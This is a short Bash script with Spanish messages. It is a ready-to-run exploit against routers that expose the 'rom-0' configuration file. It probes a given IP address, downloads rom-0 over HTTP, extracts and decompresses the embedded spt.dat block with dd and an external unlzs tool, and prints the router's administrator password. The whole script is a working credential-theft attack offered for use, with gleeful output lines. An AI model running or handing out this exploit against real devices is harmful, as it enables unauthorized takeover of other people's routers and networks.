#!/bin/bash

# ruta al binario "unlzs"
unlzs=./unlzs;

if [ $# -lt 1 ]; then
    echo -ne "\e[1;31m[-] Modo de uso: $0 <IP> [PUERTO]\e0m\n";
fi

ip=$1;
port=80;

if [ $# -eq 2 ]; then
    port=$2;
fi

echo -ne "\e[0;32m[+] Probando vulnerabilidad...\e[0m\n";
resp=`curl --connect-timeout 5 -I "http://${ip}:${port}/rom-0" 2>/dev/null`;
code=`echo $resp | head -n 1`;
ctype=`echo $resp | grep -i "content-type"`;

if ! [[ "$code" =~ "200 OK" ]] || ! [[ "$ctype" =~ "application/octet-stream" ]]; then
    echo -ne "\e[1;31m[-] Router no vulnerable! :(\e[0m\n";
    exit 1;
fi

echo -ne "\e[0;32m[+] Descargando rom-0...\e[0m\n";
rm -f /tmp/rom-0;
curl "http://${ip}:${port}/rom-0" -o /tmp/rom-0 2>/dev/null;

echo -ne "\e[0;32m[+] Obteniendo clave...\e[0m\n";
# extraer spt.dat
rm -f /tmp/spt.dat;
dd if=/tmp/rom-0 of=/tmp/spt.dat bs=1 skip=8552 count=39600 2>/dev/null;
# extraer data comprimida
rm -f /tmp/data;
dd if=/tmp/spt.dat of=/tmp/data bs=1 count=220 skip=16 2>/dev/null;
# descomprimir data y extraer password
pass=`$unlzs /tmp/data | strings | head -n 1`;

echo -ne "\e[0;32m[+] Clave obtenida: \e[1;32m${pass}\e[0m\n";
echo -ne "\e[0;32m[+] Finalizado }:)\e[0m\n";

